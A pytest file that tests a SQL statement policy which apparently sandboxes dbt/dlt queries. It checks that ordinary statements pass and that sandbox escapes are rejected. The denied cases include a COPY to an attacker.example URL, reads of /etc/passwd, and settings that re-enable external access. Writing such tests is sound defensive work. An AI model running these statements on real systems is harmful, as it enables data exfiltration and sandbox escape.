"""Capability-scoped statement policy: what dbt/dlt need is admitted; sandbox
escapes are rejected fail-closed."""

import pytest

from api.services.statement_policy import StatementNotAllowed, assert_statement_allowed

_STAGING = ["s3://warehouse/analytics/_staging/sess-1/"]
_MANAGED = {"sales", "analytics"}


def _check(sql: str) -> None:
    assert_statement_allowed(sql, staging_prefixes=_STAGING, managed_catalogs=_MANAGED)


ALLOWED = [
    "SELECT 1",
    "SELECT * FROM sales.analytics.orders WHERE n > 1",
    "INSERT INTO t SELECT 1",
    "UPDATE t SET n = 1",
    "DELETE FROM t WHERE n = 1",
    "CREATE TABLE t AS SELECT 1 AS n",
    "ALTER TABLE t ADD COLUMN c INTEGER",
    "DROP TABLE t",
    "USE sales.analytics",
    "BEGIN TRANSACTION",
    "COMMIT",
    "ROLLBACK",
    "SET timezone = 'UTC'",
    "SET search_path = 'analytics'",
    "COPY t TO 's3://warehouse/analytics/_staging/sess-1/out.parquet' (FORMAT PARQUET)",
    "COPY t FROM 's3://warehouse/analytics/_staging/sess-1/in.parquet' (FORMAT PARQUET)",
    "SELECT * FROM read_parquet('s3://warehouse/analytics/_staging/sess-1/x.parquet')",
    "ATTACH 'sales' AS sales (TYPE ICEBERG)",
    # A URL-looking string as data (not a file arg) is fine.
    "SELECT 'http://not-a-file' AS c",
]

DENIED = [
    ("COPY t TO 'http://attacker.example/x.parquet'", "copy_path"),
    ("COPY t TO '/etc/passwd'", "copy_path"),
    ("COPY t TO 's3://other-bucket/x.parquet'", "copy_path"),
    ("SET memory_limit = '8GB'", "set_name"),
    ("SET enable_external_access = true", "set_name"),
    ("SET disabled_filesystems = ''", "set_name"),
    ("INSTALL httpfs", "install"),
    ("LOAD spatial", "command"),
    ("ATTACH 'evil.db' AS evil", "attach_target"),
    ("ATTACH 'other' AS other (TYPE ICEBERG)", "attach_target"),
    ("SELECT * FROM read_parquet('/etc/passwd')", "read_path"),
    ("SELECT * FROM read_csv('s3://other/x.csv')", "read_path"),
    ("SELECT * FROM read_json_auto('/tmp/x.json')", "read_path"),
    ("SELECT * FROM glob('/**')", "read_path"),
    ("this is not sql at all ;;;", "unparseable"),
    ("", "empty"),
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_allowed(sql):
    _check(sql)  # must not raise


@pytest.mark.parametrize(("sql", "rule"), DENIED)
def test_denied(sql, rule):
    with pytest.raises(StatementNotAllowed) as exc:
        _check(sql)
    assert exc.value.rule == rule


def test_multi_statement_rejected_if_any_denied():
    with pytest.raises(StatementNotAllowed) as exc:
        _check("SELECT 1; INSTALL httpfs; SELECT 2")
    assert exc.value.rule == "install"


def test_read_parquet_with_non_literal_path_is_denied():
    # A path we cannot statically verify is rejected fail-closed.
    with pytest.raises(StatementNotAllowed) as exc:
        _check("SELECT * FROM read_parquet(concat('s3://', 'x'))")
    assert exc.value.rule == "read_path"
